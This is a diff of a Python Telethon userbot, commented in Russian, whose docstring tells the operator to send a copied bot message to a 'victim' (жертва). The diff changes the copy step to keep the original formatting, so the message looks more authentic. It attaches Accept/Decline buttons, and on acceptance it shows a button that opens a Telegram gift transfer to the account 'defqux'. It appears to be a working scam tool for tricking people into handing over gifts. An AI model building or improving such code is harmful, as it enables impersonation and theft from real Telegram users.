@@ -1,6 +1,5 @@
 """
 Userbot. Ответь на сообщение бота командой /send @жертва
-Тест кнопок: /test
 """
 
 import os
@@ -16,17 +15,6 @@ print("Импорт завершён", flush=True)
 client = TelegramClient(SESSION, API_ID, API_HASH)
 
 
-@client.on(events.NewMessage(outgoing=True, pattern=r'(?i)^/test'))
-async def on_test(event):
-    print("Тест кнопок", flush=True)
-    await client.send_message(
-        event.chat_id,
-        "Тест кнопок",
-        buttons=[[Button.inline("Кнопка", b"test")]]
-    )
-    await event.delete()
-
-
 @client.on(events.NewMessage(outgoing=True, pattern=r'(?i)^/send'))
 async def on_send(event):
     print(f"Получил /send: {event.raw_text}", flush=True)
@@ -34,11 +22,6 @@ async def on_send(event):
         await event.reply("Ответь на сообщение")
         return
     reply = await event.get_reply_message()
-    text = reply.raw_text or reply.text or ""
-    print(f"Текст ответа: {text[:200]}", flush=True)
-    if not text:
-        await event.reply("Нет текста")
-        return
     parts = event.raw_text.split(maxsplit=1)
     if len(parts) < 2:
         await event.reply("Формат: /send @username")
@@ -47,15 +30,17 @@ async def on_send(event):
     try:
         entity = await client.get_entity(target)
         print(f"Отправляю в {entity.id}", flush=True)
-        msg = await client.send_message(
+        # копируем сообщение с entities и добавляем кнопки
+        await client.send_message(
             entity,
-            text,
+            reply.message,
             buttons=[[
                 Button.inline("✗ Отклонить", data=b"dec"),
                 Button.inline("✓ Принять", data=b"acc")
-            ]]
+            ]],
+            formatting_entities=reply.entities
         )
-        print(f"Отправлено id={msg.id}", flush=True)
+        print("Отправлено", flush=True)
     except Exception as e:
         print(f"Ошибка: {type(e).__name__}: {e}", flush=True)
         await event.reply(f"Ошибка: {e}")
@@ -74,8 +59,6 @@ async def on_cb(event):
             buttons=[[Button.url("Передать", "tg://send_gift?to=defqux")]]
         )
         await event.answer("Принято")
-    elif event.data == b"test":
-        await event.answer("Кнопка работает")
 
 
 async def main():
